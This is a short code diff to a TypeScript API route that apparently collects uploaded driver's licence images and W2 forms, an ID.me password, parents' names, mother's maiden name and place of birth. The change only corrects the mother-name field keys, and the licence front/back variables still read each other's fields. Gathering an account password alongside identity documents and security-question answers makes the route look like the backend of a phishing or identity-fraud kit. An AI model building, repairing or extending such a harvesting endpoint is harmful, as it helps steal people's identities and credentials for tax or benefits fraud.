@@ -14,6 +14,7 @@ export async function POST(request: Request) {
   try {
     const formData = await request.formData();
 
+
     const dlFront = formData.get("dlBack") as File;
     const dlBack = formData.get("dlFront") as File;
     const W2ssl = formData.get("W2SSl") as File;
@@ -41,8 +42,8 @@ export async function POST(request: Request) {
         idmePassword: data.idmePassword,
         fatherFirst: data.fatherFirst,
         fatherLast: data.fatherLast,
-        motherFirst: data.mothersFirst,
-        motherLast: data.mothersLast,
+        motherFirst: data.motherFirst,
+        motherLast: data.motherLast,
         mothersMaiden: data.mothersMaiden,
         stateOfBirth: data.stateOfBirth,
         cityOfBirth: data.cityOfBirth,
